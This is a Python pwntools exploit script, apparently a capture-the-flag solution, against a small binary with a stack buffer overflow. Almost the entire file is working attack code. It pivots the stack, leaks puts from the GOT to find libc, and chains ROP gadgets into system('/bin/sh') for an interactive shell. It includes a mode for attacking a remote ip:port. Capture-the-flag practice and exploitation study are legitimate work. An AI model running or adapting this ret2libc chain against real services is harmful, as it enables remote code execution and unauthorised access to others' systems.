#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

new_stack = 0x601000 + 0x800
pop_rdi_ret = 0x0000000000400773
pop_rsi_2_ret = 0x0000000000400771

ru(b"Can you grasp this little bit of overflow?\n")
payload = flat({0x30: [new_stack, 0x4006B8]})
s(payload)

ru(b"Can you grasp this little bit of overflow?\n")
payload = flat({0x30: [new_stack + 0x40 - 8, 0x4006B8]})
s(payload)

payload = flat(
    [
        pop_rdi_ret,
        elf.got.puts,
        0x4006BF,
    ]
)
s(payload)

ru(b"\n")
libc_base = u64_ex(ru(b"\n", drop=True)) - libc.sym.puts
lg("libc_base", libc_base)

new_payload = flat(
    {
        0x10: [
            pop_rdi_ret + 1,
            pop_rdi_ret,
            libc_base + next(libc.search(b"/bin/sh\x00")),
            libc_base + libc.sym.system,
        ]
    }
)
s(new_payload)

ia()

# 54484494621358128549197059097208
